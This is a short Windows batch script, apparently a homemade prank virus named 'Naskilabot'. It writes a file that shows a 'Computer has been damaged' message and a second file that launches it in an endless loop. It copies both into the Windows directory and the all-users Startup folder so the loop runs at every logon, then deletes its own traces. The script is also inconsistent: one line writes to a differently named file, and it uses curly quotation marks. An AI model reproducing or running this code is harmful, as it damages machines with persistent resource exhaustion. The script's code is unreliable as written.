@echo off

echo @echo off>NaskilabotLassun.bat
echo title Naskilabot Lassun>>NaskilabotLassun.bat
echo echo.>>NaskilabotLassun.bat
echo echo Computer has been damaged by Naskilabot>>NaskilabotLassun.bat
echo echo.>>NaskilabotLassun.bat
echo pause>nul>>NaskilabotLassun.bat

echo @echo off>operateHusanboyBayernVirus.bat
echo :repeat>>operateNaskilabotLassun.bat
echo start “c:\Windows\NaskilabotLassun.bat”>>operateNaskilabotLassun.bat
echo goto :repeat>>operateNaskilabotLassun.bat

copy “NaskilabotLassun.bat” “c:\Windows\”
copy “operateNaskilabotLassun.bat” “c:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\”
ping localhost -n 1 >nul
del /f /q “NaskilabotLassun.bat”
del /f /q “operateNaskilabotLassun.bat”
